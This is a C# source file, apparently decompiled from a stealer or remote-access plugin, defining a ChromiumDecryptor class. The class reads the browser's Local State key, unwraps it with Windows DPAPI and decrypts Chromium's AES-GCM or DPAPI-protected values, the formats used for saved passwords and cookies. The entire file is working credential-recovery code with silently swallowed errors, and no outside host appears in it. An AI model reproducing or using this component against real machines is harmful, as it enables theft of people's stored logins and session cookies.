

using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;


namespace Plugin.Helper.Browsers
{
	public class ChromiumDecryptor
	{
		private readonly byte[] _key;

		public ChromiumDecryptor(string localStatePath)
		{
			try
			{
				if (!File.Exists(localStatePath))
					return;
				string str = File.ReadAllText(localStatePath);
				int startIndex = str.IndexOf("encrypted_key") + "encrypted_key".Length + 3;
				this._key = ProtectedData.Unprotect(((IEnumerable<byte>) Convert.FromBase64String(str.Substring(startIndex).Substring(0, str.Substring(startIndex).IndexOf('"')))).Skip<byte>(5).ToArray<byte>(), (byte[]) null, DataProtectionScope.CurrentUser);
			}
			catch (Exception ex)
			{
			}
		}

		public string Decrypt(string cipherText)
		{
			byte[] bytes = Encoding.Default.GetBytes(cipherText);
			return cipherText.StartsWith("v10") && this._key != null ? Encoding.UTF8.GetString(this.DecryptAesGcm(bytes, this._key, 3)) : Encoding.UTF8.GetString(ProtectedData.Unprotect(bytes, (byte[]) null, DataProtectionScope.CurrentUser));
		}

		private byte[] DecryptAesGcm(byte[] message, byte[] key, int nonSecretPayloadLength)
		{
			if (key == null || key.Length != 32)
				throw new ArgumentException(string.Format("Key needs to be {0} bit!", (object) 256), nameof (key));
			if (message == null || message.Length == 0)
				throw new ArgumentException("Message required!", nameof (message));
			using (MemoryStream input = new MemoryStream(message))
			{
				using (BinaryReader binaryReader = new BinaryReader((Stream) input))
				{
					binaryReader.ReadBytes(nonSecretPayloadLength);
					byte[] numArray1 = binaryReader.ReadBytes(12);
					GcmBlockCipher gcmBlockCipher = new GcmBlockCipher((IBlockCipher) new AesEngine());
					AeadParameters aeadParameters = new AeadParameters(new KeyParameter(key), 128, numArray1);
					gcmBlockCipher.Init(false, (ICipherParameters) aeadParameters);
					byte[] numArray2 = binaryReader.ReadBytes(message.Length);
					byte[] numArray3 = new byte[gcmBlockCipher.GetOutputSize(numArray2.Length)];
					try
					{
						int num = gcmBlockCipher.ProcessBytes(numArray2, 0, numArray2.Length, numArray3, 0);
						gcmBlockCipher.DoFinal(numArray3, num);
					}
					catch (InvalidCipherTextException ex)
					{
						return (byte[]) null;
					}
					return numArray3;
				}
			}
		}
	}
}
